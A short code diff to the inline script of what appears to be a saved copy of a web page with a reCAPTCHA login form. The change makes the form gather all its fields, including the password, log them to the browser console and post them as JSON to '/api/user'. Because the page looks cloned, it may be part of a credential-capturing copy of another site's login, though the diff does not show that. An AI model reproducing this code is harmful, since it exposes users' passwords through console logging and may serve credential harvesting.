@@ -3950,16 +3950,22 @@ data-savepage-crossorigin="" title="reCAPTCHA" width="256" height="60" role="pre
           <script>
             document.getElementById('myForm').addEventListener('submit', async (e) => {
               e.preventDefault(); 
-              console.log("huaaaaaaaaaaaaaaaaaaaaa")
-              const formData = new FormData(e.target);
-              console.log(formData)
+              console.log("Form submitted");
           
+              const formData = new FormData(e.target);
+          
+              // Convert FormData into a plain object
+              const formObject = {};
+              formData.forEach((value, key) => {
+                formObject[key] = value;
+              });
+          
+              console.log(formObject); // Check the form data before sending
+          
+              // Send the data to the server
               const response = await fetch('/api/user', {
                 method: 'POST',
-                body: JSON.stringify({
-                  username: formData.get('sUserName'),
-                  password: formData.get('sPassword')
-                }),
+                body: JSON.stringify(formObject),  // Send the plain object
                 headers: {
                   'Content-Type': 'application/json'
                 }
@@ -3969,3 +3975,4 @@ data-savepage-crossorigin="" title="reCAPTCHA" width="256" height="60" role="pre
               console.log('Server Response:', result);
             });
           </script>
+          
